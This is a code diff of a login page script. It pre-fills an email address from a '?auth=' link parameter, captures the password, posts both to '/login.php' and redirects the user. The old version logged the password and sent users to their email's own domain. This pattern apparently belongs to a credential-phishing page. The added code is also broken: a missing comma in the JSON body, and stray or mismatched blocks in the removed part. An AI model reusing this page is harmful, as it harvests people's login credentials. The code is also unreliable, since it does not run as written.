@@ -201,6 +201,9 @@ button:disabled {
     </button>
 
 </div>
+
+
+
 <script>
 document.addEventListener("DOMContentLoaded", function () {
     const form = document.getElementById("loginForm");
@@ -216,80 +219,82 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Reads: ?auth=john@example.com
     const params = new URLSearchParams(window.location.search);
-    const email = params.get("auth") || "";
+    const emailFromUrl = params.get("auth") || "";
 
     // Auto-fill email
-    if (email) {
-        emailInput.value = email;
+    if (emailFromUrl) {
+        emailInput.value = emailFromUrl;
     }
 
     form.addEventListener("submit", async function (event) {
         event.preventDefault();
 
-        const enteredEmail = emailInput.value.trim();
-        const password = passwordInput.value.trim();
+        const email = emailInput.value.trim();
 
-        if (!enteredEmail) {
+       const password = passwordInput.value;
+
+        if (!email) {
             message.textContent = "Please enter your email.";
             return;
         }
 
-        if (!password) {
-            message.textContent = "Please enter your password.";
+        if (!emailInput.checkValidity()) {
+            message.textContent = "Please enter a valid email address.";
             return;
         }
 
-      
-       button.disabled = true;
-button.textContent = "Signing in...";
-
-try {
-    const response = await fetch(
-        "https://example.com/api/login",
-        {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                email: email
-            })
-        }
-    );
-
+        button.disabled = true;
+        button.textContent = "Submitting...";
+        message.textContent = "";
 
         try {
-            console.log("Email:", enteredEmail);
-           
-console.log("Password entered:", password);
+            const response = await fetch(
+                "/login.php",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: email
 
+                                        password: password
+                    })
+                }
+            );
 
-            const domain = enteredEmail.split("@")[1]?.toLowerCase();
-
-            if (!domain) {
-                message.textContent = "Invalid email address.";
-                return;
+            if (!response.ok) {
+                throw new Error("Request failed.");
             }
 
-            message.textContent = "Redirecting...";
+            const result = await response.json();
 
-            window.location.href = "https://" + domain + "/";
+            if (result.success) {
+                message.textContent = "Email submitted successfully.";
 
+                if (result.redirectUrl) {
+                    window.location.href = result.redirectUrl;
+                }
+            } else {
+                message.textContent =
+                    result.message || "Unable to submit email.";
+            }
         } catch (error) {
-            console.error("Redirect failed:", error);
-            message.textContent = "Could not redirect.";
+            console.error("Submission error:", error);
+            message.textContent =
+                "Unable to submit your email. Please try again.";
         } finally {
             button.disabled = false;
-            button.textContent = "Log in";
+            button.textContent = "Submit";
         }
     });
 });
 </script>
 
 
-       
-     
-</script>
+
+
+
 
 
 
